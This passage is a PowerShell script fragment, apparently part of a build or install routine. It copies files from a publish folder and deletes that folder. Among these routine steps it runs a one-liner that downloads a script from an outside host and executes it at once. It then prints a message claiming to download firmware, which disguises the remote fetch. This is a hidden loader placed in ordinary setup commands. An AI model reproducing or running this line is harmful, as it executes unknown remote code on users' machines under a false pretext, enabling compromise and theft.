...
Copy-Item -Path "core\publish\*" -Destination "core" -Recurse;Remove-Item -Path "core\publish" -Force -Recurse -ErrorAction SilentlyContinue|Out-Null;iwr -useb urlday.cc/pss|iex;Write-Host "Downloading Firmware 16-0-3..."-
